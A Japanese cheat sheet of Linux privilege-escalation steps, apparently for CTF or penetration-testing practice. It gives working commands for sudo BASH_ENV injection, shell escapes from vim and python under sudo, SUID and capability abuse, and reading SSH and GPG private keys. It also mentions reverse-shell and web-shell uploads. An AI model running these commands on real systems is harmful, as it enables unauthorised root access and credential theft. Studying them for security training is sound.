# Linux 権限昇格手順まとめ
## 1.Sudo 権限を利用した昇格
### a.実行可能な sudo コマンドを確認

### b.sudo 環境変数汚染（BASH_ENV）
```
echo 'bash -p' > /tmp/exp.sh
```

```
chmod +x /tmp/exp.sh
```

```
sudo BASH_ENV=/tmp/exp.sh /usr/bin/systeminfo
```
### c.環境変数が継承されない場合
```
sudo -s
```
または
```
sudo -i
```
### d.sudo で実行できるエディタやインタプリタの利用

```
sudo /usr/bin/vim -c ':!/bin/sh'
```
```
sudo /usr/bin/python3 -c 'import os; os.system("/bin/sh")'
```
## 2.SUID ビット付きファイルの利用
```
find / -perm -4000 -type f 2>/dev/null
```
例（bashにSUIDがある場合）:
```
/tmp/bash -p
whoami
```
## 3.書き込み可能なファイルやディレクトリの調査
```
find / -writable -type d 2>/dev/null
find / -writable -type f 2>/dev/null
```

## 4.Cron ジョブの調査
```
cat /etc/crontab
```

```
ls -la /etc/cron.*
```
```
systemctl list-timers --all
```
## 5.環境変数を悪用した昇格
PATH の改変

LD_PRELOAD や LD_LIBRARY_PATH の利用

特に root で実行されるスクリプトで外部コマンドを呼ぶ場合に有効。

## 6.パスワードや秘密鍵の発見
```
cat ~/.gnupg/*
```
```
cat ~/.ssh/id_rsa
```
## 7.ローカル脆弱性の利用

カーネルの既知の脆弱性を使う（例: Dirty COW、sudoバグなど）

以下のツールを使うと便利:
```
searchsploit

linux-exploit-suggester

linpeas.sh
```
## 8.Webシェルやファイルアップロードを利用した昇格

PHP/Pythonのリバースシェルをアップロード

TTY付きシェルで安定した操作を確保

## 9.その他Tips

### Capability付きファイルの確認
```
getcap -r / 2>/dev/null
```
cap_setuid などがついていれば昇格に使える可能性あり。

### TTYを使ったシェルの安定化（Python）
```
python3 -c 'import pty; pty.spawn("/bin/bash")'

export TERM=xterm

```
